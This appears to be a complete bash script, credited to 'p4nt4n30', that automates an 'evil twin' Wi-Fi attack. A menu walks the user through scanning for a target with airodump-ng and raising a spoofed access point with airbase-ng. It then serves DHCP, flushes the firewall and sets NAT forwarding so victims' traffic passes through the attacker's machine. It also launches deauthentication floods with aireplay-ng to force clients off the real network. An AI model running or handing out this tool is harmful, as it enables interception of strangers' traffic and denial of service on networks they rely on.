#!/bin/bash
###########################################################################
#####Author: p4nt4n30######################################################
###########################################################################
function option0(){
	echo ""
	echo "Enter your monitor mode interface (wlan1mon): "
	read interface
}

function option1(){
	gnome-terminal -x airodump-ng $interface   &
	wait
}

function option2(){
	bssid=''
	while [ -z $bssid ]; do
		echo "Enter the BSSID: "
		read bssid
	done

	channel=''
	while [ -z $channel ]; do
		echo "Enter the Channel: "
		read channel
	done
	
	
	echo "Write File Prefix: "
	read writeFilePrefix
	if [ -z $writeFilePrefix ]; then
		echo "No Write File Specified"
	else
		writeFile=" -w $writeFilePrefix"
	fi
	

	sleep 3

	gnome-terminal  -x airodump-ng --bssid $bssid -c $channel $writeFile $interface   &
	wait
}

function option3(){
	options3=''
	echo "Time to set up the Evil Twin AP!!!"
	sleep 2
	echo "Evil Twin ESSID: "
	read etEssid
	if [ -z $etEssid ]; then
		echo "ESSID not set"
	else
		options3="$options3 --essid $etEssid"
	fi
	echo "Evil Twin BSSID[optional]: "
	read etBssid
	if [ -z $etBssid ]; then
		echo "BSSID not set"
	else
		options3="$options3 -a $etBssid"
	fi
	echo "Enter the Channel: "
	read etChannel
	if [ -z $etChannel ]; then
		echo "Channel not set"
	else
		options3="$options3 -c $etChannel"
	fi
	echo "Enter the host MAC(client connected to target AP)[optional]: "
	read etHost
	if [ -z $etHost ]; then
		echo "Host MAC not set"
	else
		options3="$options3 -h $etHost"
	fi
	echo "Enter any other options (refer to man airbase-ng...)[optional]:"
	read otherOptions
	if [ -z $otherOptions ]; then
		echo "No other options set"
	else
		options3="$options3 $otherOptions"
	fi
	sleep 3

	

	echo "Killing Airbase-ng..."
	pkill airbase-ng
	sleep 2;
	echo "Killing DHCP..."
	pkill dhcpd
	sleep 5;
	#echo $options3
	echo "Starting Fake AP..."
	gnome-terminal  -x airbase-ng $options3 $interface   &
	
	sleep 2
	echo "Starting DHCP Server..."
	etInterface=''
	while [ -z $etInterface ]; do
		echo "Enter Evil Twin Interface"
		read etInterface
	done

	etNetwork=''
	while [ -z $etNetwork ]; do
		echo "Enter Evil Twin Network (example: 10.0.0.0)"
		read etNetwork
	done

	ifconfig $etInterface up
	sleep 2

	echo "These next two setting MUST!!! match the setting in your dhcpd.conf file"
	sleep 2

	etIP=''
	while [ -z $etIP ]; do
		echo "Enter Evil Twin IPv4 Address"
		read etIP
	done

	etNetmask=''
	while [ -z $etNetmask ]; do
		echo "Enter Evil Twin netmask"
		read etNetmask
	done

	etOutInterface=''
	while [ -z $etOutInterface ]; do
		echo "Enter your internet faceing interface:"
		read etOutInterface
	done

	sleep 2
	ifconfig $etInterface up
	ifconfig $etInterface $etIP netmask $etNetmask
	route add -net $etNetwork netmask $etNetmask gw $etIP
	sleep 5

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $etOutInterface -j MASQUERADE

	echo > '/var/lib/dhcp/dhcpd.leases'
	ln -s /var/run/dhcp/dhcpd.pid /var/run/dhcpd.pid
	gnome-terminal  -x dhcpd -d -f -cf /etc/dhcp/dhcpd.conf $etInterface &
	
	sleep 5
	echo "1" >  /proc/sys/net/ipv4/ip_forward
}
function option4(){
	deauthType=''
	while [ -z $deauthType ]; do
		echo "Would you like to run a basic deauth attack? (--deauth 100)"
		echo "[1] Yes"
		echo "[2] No"
		read deauthType
	done
	echo "you selected $deauthType"
	if [ $deauthType = 1 ]; then
		gnome-terminal  -x aireplay-ng --deauth 100 -a $bssid $interface &
	fi
	
	if [ $deauthType = 2 ]; then
		echo "Enter your aireplay-ng options, you must add the -a tag, and DO NOT include the interface"
		read options4
		gnome-terminal  -x aireplay-ng $options4 $interface &
	fi
	wait
}
function option5(){
	echo "Killing airbase-ng"
	pkill airbase-ng
	sleep 1
	echo "Killing dhcpd"
	pkill dhcpd
	sleep 1
	echo "Killing aireplay-ng"
	pkill aireplay-ng
	sleep 1
	echo "Killing airodump-ng"
	pkill airodump-ng
	sleep 1
	echo "sleeping..."
	sleep 2
	exit
}
function menu(){
	echo "What would you like to do?"
	echo "[0] set up interface"
	echo "[1] find the target"
	echo "[2] hone in on target"
	echo "[3] set up Evil-Twin AP"
	echo "[4] deauth the target AP"
	echo "[5] exit"
	read userInput

	
}
function userAction(){
	case $userInput in
		0) option0 ;;
		1) option1 ;;
		2) option2 ;;
		3) option3 ;;
		4) option4 ;;
		5) option5 ;;
	esac
}
echo "##########################################################"
echo "####Evil Twin Automation##################################"
echo "##########################################################"
echo "Created By:###############################################"
echo " ______   __          _______ __          ________ ______ "
echo "(_____ \ / /         (_______) /         (_______// __   |"
echo " _____) ) /____ ____  _     / /____ ____    ____ | | //| |"
echo "|  ____/___   _)  _ \| |   |___   _)  _ \  (___ \| |// | |"
echo "| |        | | | | | | |_____  | | | | | |_____) )  /__| |"
echo "|_|        |_| |_| |_|\______) |_| |_| |_(______/ \_____/ "
echo "##########################################################"
echo "##########################################################"
echo "##########################################################"
echo "##########################################################"
echo ""
echo ""
echo "You MUST set your usb Wifi adapter in monitor mode first"
sleep 1
echo "You MUST have DHCP server installed and configured"
sleep 2
echo "Then follow the steps 1-5"
echo "This will help set up an Evil Twin AP"
echo ""
echo ""
echo ""
sleep 3
uI=0;
interface=''
while [ -z $interface ]; do
	option0
done

until [ $uI = 5 ]; do
	menu
	uI=$userInput
	#echo "you selected  $uI  hello"
	userAction
done



